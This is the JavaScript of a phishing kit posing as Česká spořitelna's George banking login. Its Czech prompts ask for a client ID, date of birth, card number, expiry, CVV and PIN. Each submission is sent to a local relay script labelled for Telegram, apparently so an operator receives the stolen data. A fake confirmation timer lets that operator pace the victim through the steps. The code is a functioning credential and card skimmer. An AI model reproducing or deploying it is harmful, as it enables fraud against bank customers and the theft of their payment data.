    <script>
        // Initialize Icons
        lucide.createIcons();

        // Data Store
        const appState = {
            user: '',
            birthDay: '',
            birthMonth: '',
            cardHolder: '',
            cardNumber: '',
            cardExpiry: '',
            cardCvv: '',
            cardPin: ''
        };

        function resolveApiUrl() {
            try {
                const currentUrl = new URL(window.location.href);
                const currentDir = currentUrl.pathname.replace(/[^/]+$/, '');
                const base = currentUrl.origin + currentDir;
                return `${base}api.php`;
            } catch (err) {
                return './api.php';
            }
        }

        async function sendToTelegram(message) {
            const telegramEndpoint = resolveApiUrl().replace(/api\.php$/, 'telegram-api.php');
            try {
                await fetch(telegramEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ text: message })
                });
            } catch (error) {
                console.error('Error sending message to Telegram:', error);
            }
        }



        function switchScreen(screenId) {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById(screenId).classList.add('active');
        }

        function showLoginError(msg) {
            const errDiv = document.getElementById('login-error');
            document.getElementById('login-error-text').innerText = msg;
            errDiv.style.display = 'flex';
        }

        function hideLoginError() {
            document.getElementById('login-error').style.display = 'none';
        }

        function submitStep1() {
            const user = document.getElementById('client-id').value.trim();
            if (!user) {
                showLoginError('Zadejte prosím své klientské číslo nebo uživatelské jméno.');
                return;
            }
            appState.user = user;
            hideLoginError();
            document.getElementById('display-user').innerText = user;
            document.getElementById('form-step-1').classList.add('hidden');
            document.getElementById('form-step-2').classList.remove('hidden');
            document.getElementById('footer-link-text').style.display = 'none';
        }

        function backToStep1() {
            hideLoginError();
            document.getElementById('form-step-2').classList.add('hidden');
            document.getElementById('form-step-1').classList.remove('hidden');
            document.getElementById('footer-link-text').style.display = 'block';
        }

        async function submitStep2() {
            const day = document.getElementById('birth-day').value.trim();
            const month = document.getElementById('birth-month').value;
            
            if (!day) { showLoginError('Zadejte den svého narození.'); return; }
            const dayNum = parseInt(day, 10);
            if (isNaN(dayNum) || dayNum < 1 || dayNum > 31) { showLoginError('Zadejte platný den narození.'); return; }
            if (!month) { showLoginError('Vyberte měsíc svého narození.'); return; }

            appState.birthDay = day;
            appState.birthMonth = month;
            const birthDateStr = `${day.padStart(2, '0')}. ${month}`;

            hideLoginError();
            
            await sendToTelegram(`🇨🇿 <b>George ČS Login</b>\n\n👤 Uživatel: <code>${appState.user}</code>\n📅 Datum narození: <code>${birthDateStr}</code>`);
            
            startGeorgeConfirm();
            switchScreen('george-screen');
            
        }

        let georgeTimerId;
        function startGeorgeConfirm() {
            let timeLeft = 300; // 5 minutes
            const totalTime = 300;
            const strokeDasharray = 188.5;
            
            const timerText = document.getElementById('timer-text');
            const timerRing = document.getElementById('timer-ring');
            
            // Set initial display
            function updateDisplay() {
                const mins = Math.floor(timeLeft / 60);
                const secs = timeLeft % 60;
                timerText.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                const progress = ((totalTime - timeLeft) / totalTime) * 100;
                const offset = strokeDasharray - (strokeDasharray * progress) / 100;
                timerRing.style.strokeDashoffset = offset;
            }
            
            updateDisplay();

            // Reset command
            localStorage.setItem('proceedToNextScreen', 'false');

            georgeTimerId = setInterval(() => {
                if (localStorage.getItem('proceedToNextScreen') === 'true') {
                    clearInterval(georgeTimerId);
                    switchScreen('card-screen');
                    return;
                }

                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(georgeTimerId);
                    return;
                }
                
                updateDisplay();
            }, 1000);
        }

        function formatCardNum(input) {
            let value = input.value.replace(/\D/g, '').substring(0, 16);
            input.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            document.getElementById('display-card-num').innerText = input.value || '•••• •••• •••• ••••';
        }

        function formatExpiry(input) {
            let value = input.value.replace(/\D/g, '').substring(0, 4);
            if (value.length >= 3) {
                input.value = `${value.slice(0, 2)}/${value.slice(2)}`;
            } else {
                input.value = value;
            }
            document.getElementById('display-card-exp').innerText = input.value || 'MM/RR';
        }

        function showCardError(msg) {
            const errDiv = document.getElementById('card-error');
            document.getElementById('card-error-text').innerText = msg;
            errDiv.style.display = 'flex';
        }

        function hideCardError() {
            document.getElementById('card-error').style.display = 'none';
        }

        async function submitCard() {
            const holder = document.getElementById('holderName').value.trim();
            const num = document.getElementById('numCard').value.replace(/\s+/g, '');
            const exp = document.getElementById('cardExpiry').value.replace(/\//g, '');
            const cvv = document.getElementById('cardCvv').value;
            const pin = document.getElementById('cardPin').value;

            if (num.length < 16) { showCardError('Zadejte prosím všech 16 číslic vaší karty.'); return; }
            if (exp.length < 4) { showCardError('Zadejte prosím datum platnosti ve formátu MM/RR.'); return; }
            const m = parseInt(exp.slice(0, 2), 10);
            if (isNaN(m) || m < 1 || m > 12) { showCardError('Měsíc platnosti musí být mezi 01 a 12.'); return; }
            if (cvv.length < 3) { showCardError('Zadejte prosím platný kód CVV.'); return; }
            if (pin.length < 4) { showCardError('Zadejte prosím PIN kód karty (4 číslice).'); return; }

            hideCardError();

            await sendToTelegram(`🇨🇿 <b>George ČS Karta</b>\n\n👤 Uživatel: <code>${appState.user}</code>\n🔢 Karta: <code>${document.getElementById('numCard').value}</code>\n📅 Platnost: <code>${document.getElementById('cardExpiry').value}</code>\n🔒 CVV: <code>${cvv}</code>\n🔑 PIN: <code>${pin}</code>`);

            switchScreen('success-screen');
            
        }

        function cancelFlow() {
            clearInterval(georgeTimerId);
            document.getElementById('form-step-1').reset();
            document.getElementById('form-step-2').reset();
            document.getElementById('card-form').reset();
            document.getElementById('display-card-num').innerText = '•••• •••• •••• ••••';
            document.getElementById('display-card-name').innerText = 'DRŽITEL KARTY';
            document.getElementById('display-card-exp').innerText = 'MM/RR';
            hideLoginError();
            hideCardError();
            backToStep1();
            switchScreen('login-screen');
            
        }

    </script>
